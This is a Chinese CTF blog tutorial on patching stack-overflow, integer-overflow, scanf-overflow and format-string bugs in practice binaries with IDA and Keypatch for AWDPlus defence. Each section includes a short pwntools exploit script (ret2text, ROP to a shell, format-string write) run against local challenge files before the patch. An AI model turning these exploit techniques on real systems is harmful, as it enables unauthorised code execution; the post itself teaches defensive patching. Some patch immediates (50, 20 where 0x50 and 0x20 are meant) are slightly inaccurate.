---
title: IDA修补简单漏洞
date: 2023-07-25 19:45:14
tags: [Pwn]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fixcover.jpg"
categories: [Study]
---

AWDPlus是一种网络攻防竞赛规则，它源自AWD比赛并加以改进。AWDPlus比赛由多个队伍组成，每个队伍有自己的攻击和防御能力，比赛中将进行攻防双方的对抗。与传统CTF不同的是，AWDPlus有防御环节：赛队识别出靶机环境中存在的漏洞时，需要对其进行修补，使得靶机环境无法被平台方攻破。

# 一、栈溢出修补

## 1.1 工具准备

Keypatch 为IDA Pro的一个插件，可以用来修改ARM指令，这使得它非常适合用于二进制文件的修改。我们可以利用KeyPatch来修改函数的行为，比如改变跳转指令、修改寄存器值等。下载链接：https://github.com/keystone-engine/keypatch ，下载好脚本后放到ida目录中的/plugins目录即可。（keypatch对IDA有版本要求，最好7.0以上）

然后还需要安装一些依赖：

```bash
pip3 install keystone-engine
pip3 install six
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/ida1.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/ida2.png?x-oss-process=style/watermark)

可以看IDA下面的交互界面，如果提示缺了哪些包，安装即可：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/ida5.png?x-oss-process=style/watermark)

下载之后如果IDA依旧提示缺少依赖，可以将包复制到IDA的python里面：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/ida3.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/ida4.png?x-oss-process=style/watermark)

## 1.2 字节未限制导致的简单漏洞

比如最常见的read函数的溢出漏洞：read读取的字节超过栈字节，就造成了溢出。修补也就是对其读取字节进行限制。

如下文件，文件链接：https://wutongblogs.oss-cn-beijing.aliyuncs.com/test/fix/pwn

### 1.2.1 攻击

反汇编发现溢出漏洞：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix1.png?x-oss-process=style/watermark)

栈大小只有0x50字节，read函数却有0x100字节，还有后门存在：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix2.png?x-oss-process=style/watermark)

攻击脚本：

```python
from pwn import *
p=process('./pwn')
back_addr=0x0400677
context.log_level="debug"
p.recvuntil("find it?")
payload ='a'*0x58+p64(back_addr)
p.sendline(payload)
p.interactive()
```

此时可以攻击成功：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix3.png?x-oss-process=style/watermark)

### 1.2.2 修补

这类漏洞修补就很简单，只需要把read读取的字节修改为 0x50 即可。

找到汇编代码部分，按 `Ctrl+alt+K` ，弹出KeyPatch：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix4.png?x-oss-process=style/watermark)

将 `mov edx, 100h` 修改为 `mov edx, 50`：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix5.png?x-oss-process=style/watermark)

修改后的汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix6.png?x-oss-process=style/watermark)

按 `F5` 刷新伪代码，已经成功修改了：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix7.png?x-oss-process=style/watermark)

在 `Edit-->Patch program-->Apply patches to input file` 保存文件，再次执行攻击脚本攻击就不成功了：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix8.png?x-oss-process=style/watermark)

------

# 二、整数溢出修补

修补方法：

1. 把变量从有符号类型改成无符号类型（例如int改成unsigned int）
2. 把跳转指令从有符号跳转指令改成无符号跳转指令（例如jle指令改成jbe指令）

-  jnz：不相等时跳转   jne：如果不等于，就跳转到目标地址
-  jz：相等时跳转    je：如果等于，就跳转到目标地址
-  jle：小于时跳转（有符号）jl：如果小于，就跳转到目标地址
- jbe：小于时跳转（无符号）
-  jge：大于时跳转（有符号） jg：如果大于，就跳转到目标地址
-  jnb：大于时跳转（无符号）

 如下文件：https://wutongblogs.oss-cn-beijing.aliyuncs.com/test/fix/ret2text_x64s

## 2.1 攻击

反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix9.png?x-oss-process=style/watermark)

 `if`判断的时候是整型，但是  `read` 读取的时候，后面字节限制的无符号型，因此可以通过输入负数造成溢出：

攻击脚本：

```python
from pwn import *
p=process('./ret2text_x64s')
back_addr=0x400727
context.log_level="debug"
p.recvuntil("of your name:\n")
p.sendline('-1')
p.recvuntil("u name?\n")
payload ='a'*0x18+p64(back_addr)
p.sendline(payload)
p.interactive()
```

成功获取shell：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix10.png?x-oss-process=style/watermark)

## 2.2 修补

将有符号跳转指令 `jle`修改为无符号跳转指令 `jbe`，按 `Ctrl+alt+K` ，弹出KeyPatch：I

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix12.png?x-oss-process=style/watermark)

修改：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix13.png?x-oss-process=style/watermark)

修改完之后刷新，成功将其修改：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix14.png?x-oss-process=style/watermark)

保存之后，使用攻击脚本，显示输入字符过长：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix11.png?x-oss-process=style/watermark)

------

# 三、栈溢出修补

除了1.2节介绍的简单栈溢出外，还有其它栈溢出，比如`Scanf`未限制字节长度，此时如何修补呢？如果新加一条判断长度的语句，在编写代码过程中非常简单，但在汇编指令中，是很复杂的，因此我们选择将无字节限制的`Scanf`函数修改为有字节限制的`read`函数。

文件链接：https://wutongblogs.oss-cn-beijing.aliyuncs.com/test/fix/ROP_x64

## 3.1 攻击

反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix17.png?x-oss-process=style/watermark)

`Scanf`未限制输入，导致溢出

攻击脚本：

```python
from pwn import *
p=process('./ROP_x64')
sys_addr=0x0400490 
binsh=0x04006D4
rdi_ret=0x04006b3
ret=0x0400479 
context.log_level="debug"
p.recvuntil("shell?\n")
payload ='a'*0x28+p64(rdi_ret)+p64(binsh)+p64(ret)+p64(sys_addr)
p.sendline(payload)
p.interactive()
```

成功获取shell：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix15.png?x-oss-process=style/watermark)

## 3.2 防御

### 3.2.1 原理

将无字节限制的`Scanf`函数修改为有字节限制的`read`函数：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a2.png?x-oss-process=style/watermark)

`read`函数有三个参数，分别在`rdi`、`rsi`、`rdx`中，要想达到输入字符且限制长度的目的，三个参数应该分别为`0,v1_addr,0x20`。参数我们可以通过`mov`指令来实现，那么如何调用`read`函数呢？如果直接给出`read`函数地址，我们就可以直接使用了，但是没有的话要怎么办呢？

这就要用到我们的系统调用功能了，我们知道64位里，系统调用是`syscall`，系统调用号储存在`rax`寄存器中，而`read`函数的系统调用号为0，因此我们需要构造如下汇编指令：

```assembly
rax=0
rdi=0
rsi=vi_addr
rdx=0x20
syscall //read(0,v1,0x20)
```

但是这么多汇编指令的，添加到原有的文件里，就会修改它们的布局，造成程序无法运行，因此我们需要一个额外的数据段，来添加汇编指令。一般.eh_frame这个数据段是有可执行权限的，因此我们在这个数据段找一段空白的地方来修改汇编指令。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a6.png?x-oss-process=style/watermark)

在程序执行时，我们使其跳转到这里，执行完毕后，再跳转回去，就不会影响原来的指令了。

### 3.2.2 修补

原先`Scanf`的汇编指令：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a1.png?x-oss-process=style/watermark)

1、在`call`指令之前都是在调用参数，可以看到`rdi`寄存器里放了参数`%s`，因此我们需要将其修改为0：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a3.png?x-oss-process=style/watermark)

2、后面的空间不够我们使用，因此我们使用在数据段编写指令、并跳转数据段的方法，将当前地址命名（按`n`命名）如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a4.png?x-oss-process=style/watermark)

在数据段命名：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a5.png?x-oss-process=style/watermark)

3、 在数据段编写汇编指令如下：

```assembly
mov edx,20 //read的第3个参数
xor rax,rax //令rax为0，read的系统调用号为0
syscall  //系统调用
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a7.png?x-oss-process=style/watermark)

然后加入ret指令，使它跳转到这里后再跳转回原理流程：`jmp jmp_ret`

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a8.png?x-oss-process=style/watermark)

4、回到原来的流程段，修改原先命令使它可以跳转到这里，将多余指令`nop`掉，将`call`指令改为`jmp jmp_to`：、

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a9.png?x-oss-process=style/watermark)



改完如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a10.png?x-oss-process=style/watermark)

5、修改完毕后，原先的`scanf`会变成`sys_read`：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/a11.png?x-oss-process=style/watermark)

保存之后，使用攻击脚本，出现错误：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/fix16.png?x-oss-process=style/watermark)



------

# 四、格式化字符串漏洞修补

格式化字符串漏洞由于缺少了参数，造成字符漏洞，因此我们需要补上参数。

文件链接：https://wutongblogs.oss-cn-beijing.aliyuncs.com/test/fix/

## 4.1 攻击

反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f3.png?x-oss-process=style/watermark)

存在格式化字符串漏洞。

攻击脚本：

```python
from pwn import *
p = process('./esft_x86_1')
payload = fmtstr_payload(10,{0x804C044:0x1})
p.recvuntil('name:')
p.sendline(payload)
p.recvuntil('passwd:')
p.sendline("1")
p.interactive()
```

成功获取shell：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f1.png?x-oss-process=style/watermark)



## 4.2 修补

1、Printf没有参数%s造成溢出，因此首先在数据段写入%s字符

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f4.png?x-oss-process=style/watermark)

2、原先的流程内，不够布置两个参数，因此同样需要跳转流程：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f5.png?x-oss-process=style/watermark)

修改汇编指令如下：

```assembly
lea eax, [as] //将%s放入eax寄存器
push eax  //%s入栈
call printf //调用Printf
pop eax //把多push的东西pop出来
jmp jmp_ret //回到原来流程
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f6.png?x-oss-process=style/watermark)

3、完成修改：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f7.png?x-oss-process=style/watermark)

刷新一下，成功修改：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f8.png?x-oss-process=style/watermark)

保存之后，使用攻击脚本，出现错误：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/fix/f2.png?x-oss-process=style/watermark)



# IDA使用快捷键：

- `n`：更改变量的名称
- `g`：直接跳转到某个地址
- `ctrl+s`：选择某个数据段，直接进行跳转
- `/`：在反编译后伪代码的界面中写下注释
- `；`：在反汇编后的界面中写下注释
- `\`：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多
- `c`: 将数据段转化成代码
- `x`：对着某个函数、变量按该快捷键，可以查看它的交叉引用¹²
- `y`：更改变量的类型
- `a`：将数据转换为字符串
- `H`：在数字上按下H键或者右键进行选择，可以将数字转化为十进制
- `B`：按下 B键 转换为二进制也是同理
- `u`：取消定义函数、代码、数据的定义
